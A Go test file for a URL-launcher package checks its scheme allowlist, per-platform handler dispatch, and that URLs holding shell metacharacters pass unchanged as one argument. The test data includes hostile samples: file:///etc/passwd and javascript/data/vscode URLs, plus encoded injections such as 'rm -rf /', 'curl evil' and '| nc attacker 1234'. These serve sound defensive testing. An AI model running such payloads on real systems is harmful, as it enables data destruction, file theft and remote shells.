package launcher

import (
	"errors"
	"reflect"
	"testing"
)

type spy struct {
	called bool
	name   string
	args   []string
	err    error
}

func (s *spy) run(name string, args ...string) error {
	s.called = true
	s.name = name
	s.args = append([]string(nil), args...)
	return s.err
}

func TestOpen_SchemeAllowlist(t *testing.T) {
	tests := []struct {
		name    string
		url     string
		allowed []string
		wantErr error
	}{
		{"http allowed", "http://example.com", []string{"http", "https"}, nil},
		{"https allowed", "https://example.com/path", []string{"http", "https"}, nil},
		{"gemini allowed", "gemini://gemini.circumlunar.space/", []string{"gemini"}, nil},
		{"mailto allowed", "mailto:alice@example.com", []string{"mailto"}, nil},
		{"http not in allowlist", "http://example.com", []string{"https"}, ErrDisallowedScheme},
		{"file rejected by default", "file:///etc/passwd", DefaultAllowlist, ErrDisallowedScheme},
		{"javascript rejected by default", "javascript:alert(1)", DefaultAllowlist, ErrDisallowedScheme},
		{"data rejected by default", "data:text/html,<script>alert(1)</script>", DefaultAllowlist, ErrDisallowedScheme},
		{"vscode rejected by default", "vscode://open?file=/etc/passwd", DefaultAllowlist, ErrDisallowedScheme},
		{"bare path rejected", "/index.md", DefaultAllowlist, ErrDisallowedScheme},
		{"empty url rejected", "", DefaultAllowlist, ErrDisallowedScheme},
		{"uppercase URL scheme matches lowercase allowlist", "HTTPS://example.com", []string{"https"}, nil},
		{"uppercase allowlist entry matches lowercase URL scheme", "https://example.com", []string{"HTTPS"}, nil},
		{"mixed case on both sides", "HtTpS://example.com", []string{"Https"}, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s := &spy{}
			err := openWith(tt.url, tt.allowed, "darwin", s.run)
			if tt.wantErr == nil && err != nil {
				t.Fatalf("want nil error, got %v", err)
			}
			if tt.wantErr != nil && !errors.Is(err, tt.wantErr) {
				t.Fatalf("want error %v, got %v", tt.wantErr, err)
			}
			if tt.wantErr != nil && s.called {
				t.Fatal("runner should not be called when scheme is disallowed")
			}
			if tt.wantErr == nil && !s.called {
				t.Fatal("runner should be called when scheme is allowed")
			}
		})
	}
}

func TestOpen_PlatformDispatch(t *testing.T) {
	tests := []struct {
		name     string
		goos     string
		url      string
		wantName string
		wantArgs []string
	}{
		{"darwin uses open", "darwin", "https://example.com", "open", []string{"https://example.com"}},
		{"linux uses xdg-open", "linux", "https://example.com", "xdg-open", []string{"https://example.com"}},
		{"freebsd uses xdg-open", "freebsd", "https://example.com", "xdg-open", []string{"https://example.com"}},
		{"openbsd uses xdg-open", "openbsd", "https://example.com", "xdg-open", []string{"https://example.com"}},
		{"netbsd uses xdg-open", "netbsd", "https://example.com", "xdg-open", []string{"https://example.com"}},
		{"windows uses rundll32", "windows", "https://example.com", "rundll32", []string{"url.dll,FileProtocolHandler", "https://example.com"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s := &spy{}
			if err := openWith(tt.url, []string{"https"}, tt.goos, s.run); err != nil {
				t.Fatalf("openWith: %v", err)
			}
			if s.name != tt.wantName {
				t.Errorf("name: got %q, want %q", s.name, tt.wantName)
			}
			if !reflect.DeepEqual(s.args, tt.wantArgs) {
				t.Errorf("args: got %v, want %v", s.args, tt.wantArgs)
			}
		})
	}
}

func TestOpen_UnsupportedPlatform(t *testing.T) {
	s := &spy{}
	err := openWith("https://example.com", []string{"https"}, "plan9", s.run)
	if !errors.Is(err, ErrNoHandler) {
		t.Fatalf("want ErrNoHandler, got %v", err)
	}
	if s.called {
		t.Fatal("runner must not be called on unsupported platform")
	}
}

// TestOpen_ShellMetacharactersPreserved confirms that URL contents containing
// shell metacharacters are passed verbatim to the handler as a single argv arg.
// This is the critical security property of the package: no shell is ever
// invoked, so ;, $(), backticks, &&, newlines, etc. cannot escape.
func TestOpen_ShellMetacharactersPreserved(t *testing.T) {
	// These URLs contain characters that a shell would interpret if we ever
	// built a shell command string. net/url.Parse must accept them and the
	// runner must see them byte-for-byte in args[0].
	malicious := []string{
		"https://example.com/?q=%3B%20rm%20-rf%20%2F",       // ; rm -rf /
		"https://example.com/?q=%24%28whoami%29",            // $(whoami)
		"https://example.com/?q=%60id%60",                   // `id`
		"https://example.com/?q=%26%26%20curl%20evil",       // && curl evil
		"https://example.com/?q=%0Acat%20%2Fetc%2Fpasswd",   // \ncat /etc/passwd
		"https://example.com/?q=%7C%20nc%20attacker%201234", // | nc attacker 1234
	}
	for _, raw := range malicious {
		t.Run(raw, func(t *testing.T) {
			s := &spy{}
			if err := openWith(raw, []string{"https"}, "darwin", s.run); err != nil {
				t.Fatalf("openWith: %v", err)
			}
			if len(s.args) != 1 {
				t.Fatalf("expected exactly 1 arg, got %d: %v", len(s.args), s.args)
			}
			if s.args[0] != raw {
				t.Errorf("URL mutated in argv: got %q, want %q", s.args[0], raw)
			}
		})
	}
}

func TestOpen_RunnerErrorPropagated(t *testing.T) {
	want := errors.New("handler crashed")
	s := &spy{err: want}
	err := openWith("https://example.com", []string{"https"}, "darwin", s.run)
	if !errors.Is(err, want) {
		t.Fatalf("want %v, got %v", want, err)
	}
}

func TestDefaultAllowlist(t *testing.T) {
	want := map[string]bool{"http": true, "https": true, "gemini": true, "mailto": true}
	if len(DefaultAllowlist) != len(want) {
		t.Fatalf("default allowlist size changed: %v", DefaultAllowlist)
	}
	for _, s := range DefaultAllowlist {
		if !want[s] {
			t.Errorf("unexpected scheme in default allowlist: %q", s)
		}
	}
	forbidden := []string{"file", "javascript", "data", "vscode"}
	for _, bad := range forbidden {
		for _, s := range DefaultAllowlist {
			if s == bad {
				t.Errorf("dangerous scheme %q must not be in default allowlist", bad)
			}
		}
	}
}
